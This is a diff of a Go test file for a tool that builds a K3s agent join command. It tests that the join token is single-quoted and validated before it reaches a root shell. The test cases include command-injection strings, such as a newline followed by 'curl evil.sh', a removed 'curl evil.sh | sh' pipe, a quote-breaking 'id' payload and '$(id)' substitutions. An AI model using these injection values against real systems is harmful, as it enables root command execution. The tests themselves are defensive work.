@@ -116,10 +116,9 @@ func TestTheCommandJoinsAnAgentAndLabelsIt(t *testing.T) {
 	}
 }
 
-// The token is pasted in by a person from a file on another machine and goes
-// into a root shell, so it is held to the shapes K3s writes rather than
-// escaped and hoped over. Every rejected case below is a command that would
-// otherwise run.
+// The token goes into a root shell single-quoted, so it may hold anything the
+// quoting carries — a cluster's --token is whatever its operator chose — and
+// nothing that would end the quoted word or split the line.
 func TestAJoinTokenCannotEndTheCommand(t *testing.T) {
 	const digest = "6f8a2c4e9b1d3f5a7c9e0b2d4f6a8c0e1b3d5f7a9c1e3b5d7f9a1c3e5b7d9f1a"
 	for _, tc := range []struct {
@@ -134,14 +133,17 @@ func TestAJoinTokenCannotEndTheCommand(t *testing.T) {
 		{"plain password", "s3cr3t-Token_1", true},
 		{"base64 password", "c2VjcmV0K3Rva2Vu/x==", true},
 
+		// Characters a shell would act on, which the quoting carries as they are.
+		{"custom with symbols", "p@ss!#%&*()[]{}<>|;$`~^", true},
+		{"custom with a substitution", "pw$(id)", true},
+
 		{"empty", "", false},
-		{"semicolon", "K10" + digest + "::server:pw; curl evil.sh | sh", false},
-		{"substitution", "pw$(id)", false},
-		{"backtick", "pw`id`", false},
 		{"single quote", "pw'; id; '", false},
 		{"space", "pw --server https://evil", false},
+		{"tab", "pw\tid", false},
 		{"newline", "pw\ncurl evil.sh", false},
-		{"pipe", "pw|id", false},
+		{"control character", "pw\x00id", false},
+		{"not ASCII", "pässword", false},
 		{"secure form with a non-hex digest", "K10secret::server:pw", false},
 		{"secure form with no credential", "K10" + digest + "::", false},
 		{"too long", strings.Repeat("a", 513), false},
@@ -152,7 +154,7 @@ func TestAJoinTokenCannotEndTheCommand(t *testing.T) {
 				t.Fatalf("ValidateToken(%q) = %v, want accepted", tc.token, err)
 			}
 			if !tc.ok && err == nil {
-				t.Fatalf("ValidateToken(%q) was accepted — it would run in a root shell", tc.token)
+				t.Fatalf("ValidateToken(%q) was accepted — it would end the quoted word in a root shell", tc.token)
 			}
 		})
 	}
@@ -165,6 +167,10 @@ func TestTheTokenIsQuotedInTheCommand(t *testing.T) {
 	got := BuildCommand("https://10.0.0.1:6443", "K10ab::server:pw", Machine{})
 	if !strings.Contains(got, "K3S_TOKEN='K10ab::server:pw' sh -s -") {
 		t.Errorf("the token is not single-quoted:\n%s", got)
+	}
+	got = BuildCommand("https://10.0.0.1:6443", "pw$(id)`id`;id", Machine{})
+	if !strings.Contains(got, "K3S_TOKEN='pw$(id)`id`;id' sh -s -") {
+		t.Errorf("a token with shell syntax in it is not one quoted word:\n%s", got)
 	}
 	got = BuildCommand("https://10.0.0.1:6443", "pw'; id; '", Machine{})
 	if !strings.Contains(got, `K3S_TOKEN='pw'\''; id; '\''' sh -s -`) {
@@ -347,7 +353,7 @@ func TestAStoredMalformedJoinTokenMakesNoCommand(t *testing.T) {
 	ctx := context.Background()
 	j := testJoiner(t, true)
 
-	sealed, err := j.keeper.Seal("pw$(id)")
+	sealed, err := j.keeper.Seal("pw'; id; '")
 	if err != nil {
 		t.Fatalf("seal: %v", err)
 	}
@@ -360,7 +366,7 @@ func TestAStoredMalformedJoinTokenMakesNoCommand(t *testing.T) {
 	if err == nil {
 		t.Fatalf("a command was built from a malformed stored token:\n%s", cmd)
 	}
-	if strings.Contains(err.Error(), "pw$(id)") {
+	if strings.Contains(err.Error(), "id; ") {
 		t.Error("the refusal carries the token")
 	}
 }
